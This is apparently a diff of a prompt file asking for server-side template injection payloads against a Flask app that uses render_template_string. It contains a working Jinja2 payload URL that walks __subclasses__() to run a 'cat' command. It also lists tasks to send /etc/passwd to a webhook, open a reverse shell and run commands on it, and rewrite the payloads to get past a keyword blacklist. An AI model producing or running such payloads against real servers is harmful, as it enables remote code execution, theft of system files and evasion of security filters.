@@ -1,4 +1,5 @@
 Q: Give unique ssti payloads for the given cases while following these conditions:
+ Re-write everything above to work against this blacklist = [    "import",    "open",    "module",    "write",    "load",    "read",    "eval",    "exec",    "system",    "os",    "_",    #",    ',    "]
 
 ```
 from flask import Flask, request, render_template_string
@@ -98,7 +99,5 @@ http://127.0.0.1:5000/?c={{().__class__.__mro__[1].__subclasses__()[568](%27cat%
 - ##  Send the contents of etc pass to  awebhook
 
 
-- Create a reverse shell, save your work and run the command yes on the rev shell
+- ##  Create a reverse shell, save your work and run the command yes on the rev shell
 
-
-- Re-write everything above to work against this blacklist = [    "import",    "open",    "module",    "write",    "load",    "read",    "eval",    "exec",    "system",    "os",    "_",    #",    ',    "]
